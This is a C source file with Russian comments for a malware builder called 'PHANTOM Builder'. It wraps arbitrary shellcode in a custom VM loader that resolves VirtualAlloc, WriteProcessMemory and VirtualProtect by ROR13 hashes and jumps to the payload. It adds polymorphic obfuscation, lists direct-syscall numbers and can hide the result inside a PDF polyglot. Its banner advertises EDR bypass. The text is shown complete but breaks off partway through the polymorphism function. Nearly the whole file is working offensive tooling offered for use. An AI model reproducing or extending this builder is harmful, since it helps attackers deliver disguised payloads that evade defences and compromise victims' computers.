/**
 * @file phantom_builder.c
 * @brief Билдер для создания полиморфного шелл-кода и внедрения его в PDF
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <ctype.h>
#ifdef _WIN32
#include <windows.h>
#include <direct.h>
#else
#include <stdint.h>
#include <unistd.h>
typedef uint8_t BYTE;
typedef int BOOL;
#ifndef TRUE
#define TRUE 1
#define FALSE 0
#endif
typedef size_t SIZE_T;
#endif

#define MAX_SHELLCODE_SIZE 8192
#define MAX_PATH_LENGTH 260
#define MAX_PAYLOAD_SIZE 8192

// Настройки для сборки
typedef struct {
    char output_file[MAX_PATH_LENGTH];
    char template_file[MAX_PATH_LENGTH];
    char payload_file[MAX_PATH_LENGTH];
    char pdf_file[MAX_PATH_LENGTH];
    BOOL use_pdf;
    BYTE key[32];
    int key_size;
    int obfuscation_level;
} BuilderConfig;

// --- Прототипы функций --- 
void rc4_ksa(const BYTE* key, int key_len, BYTE* s_block);
void rc4_crypt(BYTE* s_block, const BYTE* input, BYTE* output, SIZE_T length);
BYTE* LoadFile(const char* filename, SIZE_T* size);
BOOL WriteFile(const char* filename, const BYTE* data, SIZE_T size);
void GenerateRandomKey(BYTE* key, int size);
BYTE* CompileToBytecode(const BYTE* payload, SIZE_T payload_size, SIZE_T* bytecode_size);
BYTE* FindMarker(BYTE* data, SIZE_T data_size, const BYTE* marker, SIZE_T marker_size);
BOOL BuildPhantomPayload(const BuilderConfig* config);
BYTE* BuildPolymorphicShellcode(const BYTE* original, SIZE_T size, int level, SIZE_T* out_size);
void ObfuscateStringsInBinary(BYTE* data, SIZE_T size);
BYTE* AdvancedEncryptPayload(const BYTE* payload, SIZE_T size, const BYTE* key, int key_size, 
                         int obfuscation_level, SIZE_T* out_size);
// BYTE* EncryptPayload(const BYTE* payload, SIZE_T size, const BYTE* key, int key_size); // Закомментировано, т.к. не используется/не определено

// Загрузка файла в память
BYTE* LoadFile(const char* filename, SIZE_T* size) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        printf("[-] Ошибка: не удалось открыть файл %s\n", filename);
        return NULL;
    }
    
    // Определяем размер файла
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    // Выделяем память и читаем файл
    BYTE* buffer = (BYTE*)malloc(*size);
    if (!buffer) {
        printf("[-] Ошибка: не удалось выделить память для файла\n");
        fclose(file);
        return NULL;
    }
    
    SIZE_T read = fread(buffer, 1, *size, file);
    fclose(file);
    
    if (read != *size) {
        printf("[-] Ошибка: не удалось прочитать весь файл\n");
        free(buffer);
        return NULL;
    }
    
    return buffer;
}

// Запись файла на диск
BOOL WriteFile(const char* filename, const BYTE* data, SIZE_T size) {
    FILE* file = fopen(filename, "wb");
    if (!file) {
        printf("[-] Ошибка: не удалось создать файл %s\n", filename);
        return FALSE;
    }
    
    SIZE_T written = fwrite(data, 1, size, file);
    fclose(file);
    
    if (written != size) {
        printf("[-] Ошибка: не удалось записать весь файл\n");
        return FALSE;
    }
    
    return TRUE;
}

// Генерация случайного ключа
void GenerateRandomKey(BYTE* key, int size) {
    srand((unsigned int)time(NULL));
    for (int i = 0; i < size; i++) {
        key[i] = (BYTE)(rand() % 256);
    }
}

// Внедрение шелл-кода в шаблон загрузчика
BYTE* BuildLoader(const char* template_file, const BYTE* encrypted_bytecode, SIZE_T bytecode_len, 
                  const BYTE* key, int key_size, SIZE_T* output_size) {
    // Загружаем шаблон загрузчика
    SIZE_T template_size = 0;
    BYTE* template_data = LoadFile(template_file, &template_size);
    if (!template_data) {
        return NULL;
    }
    
    // Ищем маркеры для замены
    const char* key_size_marker = "key_size:";
    const char* key_marker = "encryption_key:";
    const char* bytecode_size_marker = "bytecode_size:";
    const char* bytecode_payload_marker = "bytecode_payload:";
    
    char* key_size_pos = strstr((char*)template_data, key_size_marker);
    char* key_pos = strstr((char*)template_data, key_marker);
    char* bytecode_size_pos = strstr((char*)template_data, bytecode_size_marker);
    char* bytecode_payload_pos = strstr((char*)template_data, bytecode_payload_marker);
    
    if (!key_size_pos || !key_pos || !bytecode_size_pos || !bytecode_payload_pos) {
        printf("[-] Ошибка: маркеры не найдены в шаблоне (key_size, encryption_key, bytecode_size, bytecode_payload)\n");
        free(template_data);
        return NULL;
    }
    
    // Обновляем размер ключа
    sprintf(key_size_pos, "key_size:\n    dq %d", key_size);
    
    // Обновляем ключ шифрования (16 байт после маркера + следующая строка)
    key_pos = strchr(key_pos, '\n') + 1;
    for (int i = 0; i < key_size; i += 8) {
        key_pos += sprintf(key_pos, "    db ");
        for (int j = 0; j < 8 && (i + j) < key_size; j++) {
            key_pos += sprintf(key_pos, "0x%02X", key[i + j]);
            if (j < 7 && (i + j + 1) < key_size) {
                key_pos += sprintf(key_pos, ", ");
            }
        }
        key_pos += sprintf(key_pos, "\n");
    }
    
    // Обновляем размер байткода
    bytecode_size_pos = strchr(bytecode_size_pos, ':') + 1;
    while(*bytecode_size_pos && isspace(*bytecode_size_pos)) bytecode_size_pos++;
    sprintf(bytecode_size_pos, "\n    dq %zu", bytecode_len);
    
    // Обновляем зашифрованный байткод
    bytecode_payload_pos = strchr(bytecode_payload_pos, ':') + 1;
    while(*bytecode_payload_pos && isspace(*bytecode_payload_pos)) bytecode_payload_pos++;
    char* end_line = strchr(bytecode_payload_pos, '\n');
    if (end_line) *end_line = '\0'; 
    bytecode_payload_pos += sprintf(bytecode_payload_pos, "\n    db ");
    
    for (SIZE_T i = 0; i < bytecode_len; i++) {
        bytecode_payload_pos += sprintf(bytecode_payload_pos, "0x%02X", encrypted_bytecode[i]);
        if (i < bytecode_len - 1) {
            if ((i + 1) % 16 == 0) {
                bytecode_payload_pos += sprintf(bytecode_payload_pos, "\\\n    db ");
            } else {
                bytecode_payload_pos += sprintf(bytecode_payload_pos, ",");
            }
        }
    }
    bytecode_payload_pos += sprintf(bytecode_payload_pos, "\n");
    
    // Обновляем размер выходных данных
    *output_size = strlen((char*)template_data);
    
    return template_data;
}

// Создание файла типа PDF+EXE (polyglot)
BOOL CreatePolyglotFile(const char* pdf_file, const BYTE* shellcode, SIZE_T shellcode_size, const char* output_file) {
    // Загружаем PDF файл
    SIZE_T pdf_size = 0;
    BYTE* pdf_data = LoadFile(pdf_file, &pdf_size);
    if (!pdf_data) {
        return FALSE;
    }
    
    // Выделяем память для polyglot файла
    SIZE_T polyglot_size = pdf_size + shellcode_size + 1024; // Запас для метаданных
    BYTE* polyglot_data = (BYTE*)malloc(polyglot_size);
    if (!polyglot_data) {
        printf("[-] Ошибка: не удалось выделить память для polyglot\n");
        free(pdf_data);
        return FALSE;
    }
    
    // Копируем содержимое PDF
    memcpy(polyglot_data, pdf_data, pdf_size);
    SIZE_T offset = pdf_size;
    
    // Добавляем комментарий PDF для связывания
    const char* comment = "\n%PDF-1.7-EXEC\n";
    SIZE_T comment_len = strlen(comment);
    memcpy(polyglot_data + offset, comment, comment_len);
    offset += comment_len;
    
    // Добавляем шелл-код
    memcpy(polyglot_data + offset, shellcode, shellcode_size);
    offset += shellcode_size;
    
    // Добавляем трейлер PDF и ссылку на скрипт
    const char* trailer = "\ntrailer\n<<\n/Root 1 0 R\n/Size 5\n>>\nstartxref\n%%EOF\n";
    SIZE_T trailer_len = strlen(trailer);
    memcpy(polyglot_data + offset, trailer, trailer_len);
    offset += trailer_len;
    
    // Записываем polyglot файл
    BOOL result = WriteFile(output_file, polyglot_data, offset);
    
    // Освобождаем память
    free(polyglot_data);
    free(pdf_data);
    
    return result;
}

// Компиляция загрузчика из исходного кода
BOOL CompileLoader(const char* asm_file, const char* output_file) {
    char command[MAX_PATH_LENGTH * 3];
    
    // Создаем команду для сборки с NASM
    sprintf(command, "nasm -f bin -o %s %s", output_file, asm_file);
    
    // Выполняем команду
    int result = system(command);
    
    return (result == 0);
}

// Опкоды нашей VM (пример)
#define VM_PUSH_CONST_QWORD 0x01
#define VM_LOAD_API_HASH    0x02
#define VM_CALL_API         0x03 // Вызов API из VM_R0 (r14), аргументы со стека VM
#define VM_POP_REG          0x04 // POP со стека VM в регистр VM (например, R0/r14)
#define VM_PUSH_REG         0x05 // PUSH регистра VM на стек VM
#define VM_JMP_REG          0x06 // JMP на адрес в регистре VM (например, R0/r14)
#define VM_MOV_REG_CONST    0x07 // MOV VM_Rx, CONST64 (Пока только для R0/r14)
#define VM_HALT             0xFF

// --- Вычисление хеша API (ROR13 + ADD) --- 
// Должно совпадать с calc_hash в stage0.asm
uint32_t CalculateApiHash(const char* function_name) {
    uint32_t hash = 0;
    uint32_t current_char;
    while (*function_name) {
        current_char = (uint32_t)(*function_name);
        // Приведение к нижнему регистру (простой вариант)
        if (current_char >= 'A' && current_char <= 'Z') {
            current_char += ('a' - 'A');
        }
        // ROR 13
        hash = (hash >> 13) | (hash << (32 - 13));
        // ADD
        hash += current_char;
        function_name++;
    }
    return hash;
}

// --- Актуальные хеши API (Вычислены для kernel32.dll) --- 
// printf("VirtualAlloc: 0x%X\n", CalculateApiHash("VirtualAlloc")); 
// printf("WriteProcessMemory: 0x%X\n", CalculateApiHash("WriteProcessMemory")); 
// printf("VirtualProtect: 0x%X\n", CalculateApiHash("VirtualProtect")); 
// printf("ExitProcess: 0x%X\n", CalculateApiHash("ExitProcess")); 

#define HASH_KERNEL32          0x68CF2B3B // Примерный хеш для kernel32.dll (нужно вычислить!)
#define HASH_NTDLL             0x3CFA685D // Примерный хеш для ntdll.dll (нужно вычислить!)
#define HASH_VIRTUALALLOC      0xE5534117 // Правильный хеш для VirtualAlloc
#define HASH_WRITEPROCESSMEMORY 0x1E38AE13 // Правильный хеш для WriteProcessMemory
#define HASH_VIRTUALPROTECT    0x8058EBC0 // Правильный хеш для VirtualProtect
#define HASH_CHECKREMOTEDEBUGGER 0x43AF7D80 // Хеш для CheckRemoteDebuggerPresent
#define HASH_EXITPROCESS       0x56A2B5F0 // Правильный хеш для ExitProcess

// --- Новые опкоды VM --- 
#define VM_MOV_REG_REG      0x10
#define VM_MOV_REG_MEM      0x11
#define VM_MOV_MEM_REG      0x12
#define VM_MOV_REG_MEM_STACK 0x13
#define VM_MOV_MEM_STACK_REG 0x14
#define VM_ADD_REG_REG      0x20
#define VM_SUB_REG_REG      0x21
#define VM_XOR_REG_REG      0x22
#define VM_JZ_REG           0x09
#define VM_JNZ_REG          0x0B
#define VM_XOR_MEM          0x0A
#define VM_SYSCALL          0x0C

// --- Регистры VM --- 
#define VM_REG_R0 0 // r14
#define VM_REG_R1 1 // r13
#define VM_REG_R2 2 // r12
#define VM_REG_R3 3 // r11

// --- SSN для Windows 10/11 x64 (Примеры, нужно проверять!) ---
// Источник: https://j00ru.vexillium.org/syscalls/nt/64/
#define SSN_NTALLOCATEVIRTUALMEMORY_WIN10 0x18
#define SSN_NTWRITEVIRTUALMEMORY_WIN10   0x3A
#define SSN_NTPROTECTVIRTUALMEMORY_WIN10 0x50 // Может понадобиться для PAGE_EXECUTE
#define SSN_NTCREATE THREADEX_WIN10     0xC1 // Альтернатива JMP_REG
#define SSN_NTTERMINATEPROCESS_WIN10    0x2C // Для HALT

// --- Вспомогательная функция для выбора SSN --- 
// TODO: Реализовать определение версии Windows и выбор правильных SSN
uint32_t GetSsn(const char* function_name) {
    // Пока возвращаем для Win10/11
    if (strcmp(function_name, "NtAllocateVirtualMemory") == 0) return SSN_NTALLOCATEVIRTUALMEMORY_WIN10;
    if (strcmp(function_name, "NtWriteVirtualMemory") == 0) return SSN_NTWRITEVIRTUALMEMORY_WIN10;
    if (strcmp(function_name, "NtProtectVirtualMemory") == 0) return SSN_NTPROTECTVIRTUALMEMORY_WIN10;
    if (strcmp(function_name, "NtTerminateProcess") == 0) return SSN_NTTERMINATEPROCESS_WIN10;
    printf("[-] Ошибка: Неизвестный SSN для %s\n", function_name);
    return 0xFFFFFFFF; // Ошибка
}

// Вспомогательная функция для записи опкода и операндов
// Используем макросы для удобства
#define EMIT_BYTE(ptr, val) (*(ptr)++ = (BYTE)(val))
#define EMIT_DWORD(ptr, val) (*(uint32_t*)(ptr) = (uint32_t)(val), (ptr) += 4)
#define EMIT_QWORD(ptr, val) (*(uint64_t*)(ptr) = (uint64_t)(val), (ptr) += 8)

// Генерирует байткод для загрузки и запуска payload с использованием CALL_API
BYTE* CompileToBytecode(const BYTE* payload, SIZE_T payload_size, SIZE_T* bytecode_size) {
    // Грубая оценка размера байткода (инструкции + payload)
    SIZE_T estimated_instr_size = 500; 
    SIZE_T max_size = payload_size + estimated_instr_size;
    BYTE* bytecode = (BYTE*)malloc(max_size);
    if (!bytecode) return NULL;

    BYTE* p = bytecode;
    BYTE* start_ptr = bytecode;

    printf("[+] Generating bytecode using CALL_API...\n");

    // 1. Выделить память (VirtualAlloc)
    // LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    // Аргументы: rcx, rdx, r8, r9
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH Protect (PAGE_EXECUTE_READWRITE = 0x40)
    EMIT_QWORD(p, 0x40);
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH AllocationType (MEM_COMMIT | MEM_RESERVE = 0x3000)
    EMIT_QWORD(p, 0x3000);
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH Size (payload_size)
    EMIT_QWORD(p, payload_size); 
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH Address (NULL)
    EMIT_QWORD(p, 0);
    EMIT_BYTE(p, VM_LOAD_API_HASH);         // LOAD VirtualAlloc -> R0 (r14)
    EMIT_DWORD(p, HASH_VIRTUALALLOC);
    EMIT_BYTE(p, VM_CALL_API);              // CALL VirtualAlloc(Addr, Size, Type, Prot) 
    EMIT_BYTE(p, VM_REG_R0);                // Адрес API в R0
    EMIT_BYTE(p, 4);                        // 4 аргумента
    // Результат (адрес выделенной памяти) в R0 (r14)

    // Сохраняем BaseAddress в R1 (r13)
    EMIT_BYTE(p, VM_MOV_REG_REG);
    EMIT_BYTE(p, (VM_REG_R1 << 4) | VM_REG_R0); // MOV R1, R0

    // 2. Скопировать payload (WriteProcessMemory)
    // BOOL WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
    // Аргументы: rcx, rdx, r8, r9, stack[0]
    // Мы используем только 4 аргумента, lpNumberOfBytesWritten = NULL

    uint64_t* payload_addr_ref = NULL; // Указатель на место в байткоде, где будет адрес payload

    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH lpNumberOfBytesWritten (NULL)
    EMIT_QWORD(p, 0);
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH nSize (payload_size)
    EMIT_QWORD(p, payload_size);
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH lpBuffer* (адрес payload - заполним позже)
    payload_addr_ref = (uint64_t*)p;
    EMIT_QWORD(p, 0);
    EMIT_BYTE(p, VM_PUSH_REG);              // PUSH lpBaseAddress (из R1)
    EMIT_BYTE(p, VM_REG_R1);
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH hProcess (-1)
    EMIT_QWORD(p, (uint64_t)-1);

    EMIT_BYTE(p, VM_LOAD_API_HASH);         // LOAD WriteProcessMemory -> R0
    EMIT_DWORD(p, HASH_WRITEPROCESSMEMORY);
    EMIT_BYTE(p, VM_CALL_API);              // CALL WriteProcessMemory(hProc, BaseAddr, Buffer, Size, Written*)
    EMIT_BYTE(p, VM_REG_R0);                // Адрес API в R0
    EMIT_BYTE(p, 5);                        // 5 аргументов
    // Результат BOOL в R0 (r14) - пока не проверяем

    // 3. Изменить защиту памяти на PAGE_EXECUTE_READ (VirtualProtect)
    // BOOL VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    // Аргументы: rcx, rdx, r8, r9
    // Мы передадим NULL для lpflOldProtect, но нужно место на стеке
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH &OldProtect (Место для OldProtect - NULL)
    EMIT_QWORD(p, 0); 
    EMIT_BYTE(p, VM_MOV_REG_REG);           // MOV R2, SP (R2 = адрес для &OldProtect) 
    EMIT_BYTE(p, (VM_REG_R2 << 4) | VM_REG_R0);

    EMIT_BYTE(p, VM_PUSH_REG);              // PUSH &OldProtect (адрес из R2)
    EMIT_BYTE(p, VM_REG_R2);
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH NewProtect (PAGE_EXECUTE_READ = 0x20)
    EMIT_QWORD(p, 0x20); // Достаточно PAGE_EXECUTE_READ
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD);      // PUSH Size (payload_size)
    EMIT_QWORD(p, payload_size);
    EMIT_BYTE(p, VM_PUSH_REG);              // PUSH Address (из R1)
    EMIT_BYTE(p, VM_REG_R1);
    
    EMIT_BYTE(p, VM_LOAD_API_HASH);         // LOAD VirtualProtect -> R0
    EMIT_DWORD(p, HASH_VIRTUALPROTECT);
    EMIT_BYTE(p, VM_CALL_API);              // CALL VirtualProtect(Addr, Size, NewProt, &OldProt)
    EMIT_BYTE(p, VM_REG_R0);
    EMIT_BYTE(p, 4);                        // 4 аргумента
    // Результат BOOL в R0 - пока не проверяем

    // Очищаем стек от &OldProtect
    EMIT_BYTE(p, VM_POP_REG); EMIT_BYTE(p, VM_REG_R0); // Pop в R0

    // 4. Передать управление payload
    // R1 все еще содержит адрес начала payload
    EMIT_BYTE(p, VM_JMP_REG);
    EMIT_BYTE(p, VM_REG_R1);

    // 5. Halt (на случай, если JMP не сработает)
    // ExitProcess(0)
    EMIT_BYTE(p, VM_PUSH_CONST_QWORD); // PUSH ExitCode (0)
    EMIT_QWORD(p, 0);
    EMIT_BYTE(p, VM_LOAD_API_HASH);    // LOAD ExitProcess -> R0
    EMIT_DWORD(p, HASH_EXITPROCESS);
    EMIT_BYTE(p, VM_CALL_API);         // CALL ExitProcess(ExitCode)
    EMIT_BYTE(p, VM_REG_R0);
    EMIT_BYTE(p, 1);                   // 1 аргумент

    // На всякий случай
    EMIT_BYTE(p, VM_HALT);

    // --- Конец генерации инструкций --- 

    SIZE_T generated_instructions_size = p - start_ptr;

    // Вставляем реальный адрес/смещение payload в инструкцию PUSH
    // Адрес будет относительным к началу всего блока (инструкции + payload)
    uint64_t payload_runtime_offset = (uint64_t)generated_instructions_size;
    if (payload_addr_ref) {
        *payload_addr_ref = payload_runtime_offset;
    } else {
        printf("[!] Ошибка: Не удалось установить адрес payload в байткоде!\n");
        // Продолжаем, но, вероятно, не сработает
    }

    // Копируем сам payload в конец буфера
    if (generated_instructions_size + payload_size > max_size) { 
        printf("[!] Ошибка: Превышен максимальный размер буфера байткода! (%zu + %zu > %zu)\n",
               generated_instructions_size, payload_size, max_size);
        free(bytecode);
        return NULL;
    }
    memcpy(p, payload, payload_size);

    // Устанавливаем финальный размер (инструкции + payload)
    *bytecode_size = generated_instructions_size + payload_size;

    printf("[+] Байткод VM (CALL_API) сгенерирован успешно (инструкции: %zu, payload: %zu, итого: %zu байт)\n",
             generated_instructions_size, payload_size, *bytecode_size);

    return bytecode;
}

// Функция поиска маркера в бинарных данных
BYTE* FindMarker(BYTE* data, SIZE_T data_size, const BYTE* marker, SIZE_T marker_size) {
    for (SIZE_T i = 0; (i + marker_size) <= data_size; ++i) {
        if (memcmp(data + i, marker, marker_size) == 0) {
            return data + i;
        }
    }
    return NULL;
}

// --- RC4 Реализация --- 

// Инициализация S-блока (Key Scheduling Algorithm)
void rc4_ksa(const BYTE* key, int key_len, BYTE* s_block) {
    int i, j;
    BYTE temp;

    for (i = 0; i < 256; i++) {
        s_block[i] = (BYTE)i;
    }

    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + s_block[i] + key[i % key_len]) & 0xFF;
        // swap(S[i], S[j])
        temp = s_block[i];
        s_block[i] = s_block[j];
        s_block[j] = temp;
    }
}

// Шифрование/расшифровка данных
// Важно: эта функция модифицирует s_block!
void rc4_crypt(BYTE* s_block, const BYTE* input, BYTE* output, SIZE_T length) {
    int i = 0, j = 0;
    BYTE temp, k;
    SIZE_T counter;

    for (counter = 0; counter < length; counter++) {
        i = (i + 1) & 0xFF;
        j = (j + s_block[i]) & 0xFF;
        // swap(S[i], S[j])
        temp = s_block[i];
        s_block[i] = s_block[j];
        s_block[j] = temp;
        // k = S[(S[i] + S[j]) % 256]
        k = s_block[(s_block[i] + s_block[j]) & 0xFF];
        // output[counter] = input[counter] ^ k
        output[counter] = input[counter] ^ k;
    }
}

// Основная функция билдера
BOOL BuildPhantomPayload(const BuilderConfig* config) {
    printf("[*] Начинаем сборку v2 (Syscall + Precompiled Stage0)...\n");
    
    // --- Шаг 1: Загрузка Payload --- 
    SIZE_T payload_size = 0;
    BYTE* payload = LoadFile(config->payload_file, &payload_size);
    if (!payload) {
        return FALSE;
    }
    printf("[+] Полезная нагрузка загружена: %s (%zu байт)\n", config->payload_file, payload_size);
    
    // --- Шаг 2: Генерация Байткода VM --- 
    SIZE_T bytecode_size = 0;
    BYTE* bytecode = CompileToBytecode(payload, payload_size, &bytecode_size);
    if (!bytecode) {
        free(payload);
        return FALSE;
    }
    // Полезная нагрузка уже внутри байткода, можно освободить
    free(payload);

    // --- Шаг 3: Упрощённое шифрование байткода (plain) ---
    BYTE* encrypted_bytecode = bytecode;
    SIZE_T encrypted_size = bytecode_size;
    printf("[*] Шифрование отключено: используем plain байткод (%zu байт)\n", encrypted_size);
    
    // --- Шаг 4: Загрузка предкомпилированного stage0.bin --- 
    printf("[*] Загружаем предкомпилированный загрузчик: %s\n", config->template_file); 
    SIZE_T stage0_size = 0;
    BYTE* stage0_data = LoadFile(config->template_file, &stage0_size); // template_file теперь указывает на stage0.bin
    if (!stage0_data) {
        free(encrypted_bytecode);
        return FALSE;
    }
    printf("[+] Загрузчик stage0.bin загружен (%zu байт)\n", stage0_size);

    // --- Шаг 5: Поиск маркеров и вставка данных в stage0.bin --- 
    printf("[*] Ищем маркеры и вставляем данные...\n");
    
    // Маркеры
    const uint64_t key_size_marker_val = 0xDEADBEEFCAFEBABE;
    const BYTE key_marker_val[16] = { 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 
                                    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA };
    const uint64_t bytecode_size_marker_val = 0xFEEDFACEBABEF00D;
    const uint64_t bytecode_payload_marker_val = 0xDEADC0DEBAADC0DE;
    
    // Поиск и замена размера ключа
    BYTE* key_size_ptr = FindMarker(stage0_data, stage0_size, (BYTE*)&key_size_marker_val, sizeof(key_size_marker_val));
    if (key_size_ptr) {
        *(uint64_t*)key_size_ptr = (uint64_t)config->key_size;
        printf("[+] Размер ключа (%d) вставлен.\n", config->key_size);
    } else {
        printf("[-] Ошибка: Маркер размера ключа не найден в %s\n", config->template_file);
        free(stage0_data);
        free(encrypted_bytecode);
        return FALSE;
    }

    // Поиск и замена ключа
    BYTE* key_ptr = FindMarker(stage0_data, stage0_size, key_marker_val, config->key_size); // Размер маркера = размеру ключа
    if (key_ptr) {
        memcpy(key_ptr, config->key, config->key_size);
        printf("[+] Ключ шифрования вставлен.\n");
    } else {
        printf("[-] Ошибка: Маркер ключа шифрования не найден в %s\n", config->template_file);
        free(stage0_data);
        free(encrypted_bytecode);
        return FALSE;
    }

    // Поиск и замена размера байткода
    BYTE* bytecode_size_ptr = FindMarker(stage0_data, stage0_size, (BYTE*)&bytecode_size_marker_val, sizeof(bytecode_size_marker_val));
    if (bytecode_size_ptr) {
        *(uint64_t*)bytecode_size_ptr = encrypted_size;
        printf("[+] Размер байткода (%zu) вставлен.\n", encrypted_size);
    } else {
        printf("[-] Ошибка: Маркер размера байткода не найден в %s\n", config->template_file);
        free(stage0_data);
        free(encrypted_bytecode);
        return FALSE;
    }

    // Поиск маркера начала байткода
    BYTE* bytecode_payload_ptr = FindMarker(stage0_data, stage0_size, (BYTE*)&bytecode_payload_marker_val, sizeof(bytecode_payload_marker_val));
    if (bytecode_payload_ptr) {
        // Проверяем, достаточно ли места после маркера
        SIZE_T marker_offset = bytecode_payload_ptr - stage0_data;
        SIZE_T reserved_space = stage0_size - (marker_offset + sizeof(bytecode_payload_marker_val));
        if (encrypted_size <= reserved_space) {
            memcpy(bytecode_payload_ptr + sizeof(bytecode_payload_marker_val), encrypted_bytecode, encrypted_size);
            printf("[+] Зашифрованный байткод вставлен.\n");
        } else {
            printf("[-] Ошибка: Недостаточно места для байткода в %s (нужно %zu, доступно %zu)\n", 
                   config->template_file, encrypted_size, reserved_space);
            free(stage0_data);
            free(encrypted_bytecode);
            return FALSE;
        }
    } else {
        printf("[-] Ошибка: Маркер начала байткода не найден в %s\n", config->template_file);
        free(stage0_data);
        free(encrypted_bytecode);
        return FALSE;
    }

    // Освобождаем память зашифрованного байткода
    free(encrypted_bytecode);

    // --- Шаг 6: (Опционально) Обфускация и полиморфизм stage0.bin --- 
    // Применяем полиморфизм к модифицированному stage0_data
    if (config->obfuscation_level > 1) {
        printf("[*] Применяем полиморфизм (NOP-вставки) к stage0.bin...\n");
        SIZE_T poly_shellcode_size = 0;
        BYTE* poly_shellcode = BuildPolymorphicShellcode(stage0_data, stage0_size, config->obfuscation_level, &poly_shellcode_size);
        if (poly_shellcode) {
            free(stage0_data); // Освобождаем старый
            stage0_data = poly_shellcode; // Используем полиморфный
            stage0_size = poly_shellcode_size;
            printf("[+] Полиморфизм применен, новый размер: %zu байт\n", stage0_size);
        } else {
             printf("[-] Ошибка полиморфизма!\n");
             // Продолжаем без полиморфизма
        }
    }
    
    // Обфускация строк (если нужно и реализовано для бинарника)
    if (config->obfuscation_level > 1) {
        printf("[*] Выполняем обфускацию строк в stage0.bin...\n");
        ObfuscateStringsInBinary(stage0_data, stage0_size);
    }

    // --- Шаг 7: Запись финального файла --- 
    BOOL result = FALSE;
    if (config->use_pdf) {
        printf("[*] Создаем polyglot файл %s...\n", config->output_file);
        result = CreatePolyglotFile(config->pdf_file, stage0_data, stage0_size, config->output_file);
    } else {
        printf("[*] Записываем финальный загрузчик %s...\n", config->output_file);
        result = WriteFile(config->output_file, stage0_data, stage0_size);
    }
    
    // --- Шаг 8: Очистка --- 
    free(stage0_data);
        
    return result;
}

// Точка входа в билдер
int main(int argc, char* argv[]) {
    printf("=== PHANTOM Builder v1.0 ===\n");
    printf("Продвинутый генератор полезных нагрузок с обходом EDR\n\n");
    
    // Настройки по умолчанию
    BuilderConfig config;
    memset(&config, 0, sizeof(config));
    strcpy(config.output_file, "phantom_payload.bin");
    strcpy(config.template_file, "builders/stage0.bin");
    config.key_size = 16;
    config.obfuscation_level = 2;
    config.use_pdf = FALSE;
    
    // Генерация случайного ключа
    GenerateRandomKey(config.key, config.key_size);
    
    // Обработка аргументов командной строки
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--payload") == 0 && i + 1 < argc) {
            strcpy(config.payload_file, argv[++i]);
        } else if (strcmp(argv[i], "--output") == 0 && i + 1 < argc) {
            strcpy(config.output_file, argv[++i]);
        } else if (strcmp(argv[i], "--template") == 0 && i + 1 < argc) {
            strcpy(config.template_file, argv[++i]);
        } else if (strcmp(argv[i], "--pdf") == 0 && i + 1 < argc) {
            strcpy(config.pdf_file, argv[++i]);
            config.use_pdf = TRUE;
        } else if (strcmp(argv[i], "--obfuscation") == 0 && i + 1 < argc) {
            config.obfuscation_level = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--help") == 0) {
            printf("Использование: %s [опции]\n", argv[0]);
            printf("Опции:\n");
            printf("  --payload <файл>   - Полезная нагрузка в виде шелл-кода\n");
            printf("  --output <файл>    - Имя выходного файла (по умолчанию: phantom_payload.bin)\n");
            printf("  --template <файл>  - Шаблон ASM загрузчика (по умолчанию: stage0.asm)\n");
            printf("  --pdf <файл>       - PDF файл для создания polyglot (опционально)\n");
            printf("  --obfuscation <уровень> - Уровень обфускации (1-3, по умолчанию: 2)\n");
            printf("  --help             - Показать эту справку\n");
            return 0;
        }
    }
    
    // Проверка обязательных параметров
    if (strlen(config.payload_file) == 0) {
        printf("[-] Ошибка: не указан файл полезной нагрузки\n");
        printf("Используйте --payload <файл> для указания полезной нагрузки\n");
        return 1;
    }
    
    // Сборка
    if (BuildPhantomPayload(&config)) {
        printf("[+] Сборка успешно завершена: %s\n", config.output_file);
        printf("[+] Размер ключа: %d байт\n", config.key_size);
        printf("[+] Уровень обфускации: %d\n", config.obfuscation_level);
        if (config.use_pdf) {
            printf("[+] Создан polyglot PDF: %s\n", config.output_file);
        }
                return 0;
    } else {
        printf("[-] Сборка не удалась!\n");
        return 1;
    }
}

// Функция для инициализации обфускации
void InitializeObfuscation(BuilderConfig* config) {
    // Создаем таблицу переименования для полиморфного ASM
    if (config->obfuscation_level > 1) {
        printf("[*] Инициализация обфускации уровня %d\n", config->obfuscation_level);
        
        // Можно добавить разные стратегии обфускации в зависимости от уровня
        if (config->obfuscation_level >= 3) {
            // Максимальная обфускация
            printf("[+] Активирована продвинутая полиморфная защита\n");
            // Динамическое шифрование данных в памяти
            // Сегментация шелл-кода на несколько частей
            // Добавление ложных переходов для запутывания анализа
        }
    }
}

// Функция для сборки полиморфного шелл-кода разных уровней
BYTE* BuildPolymorphicShellcode(const BYTE* original, SIZE_T size, int level, SIZE_T* out_size) {
    srand((unsigned int)time(NULL)); // Инициализация ГПСЧ

    // На уровне 1 просто копируем оригинальный шелл-код
    if (level <= 1) {
        BYTE* result = (BYTE*)malloc(size);
        if (!result) return NULL;
        
        memcpy(result, original, size);
        *out_size = size;
        return result;
    }
    
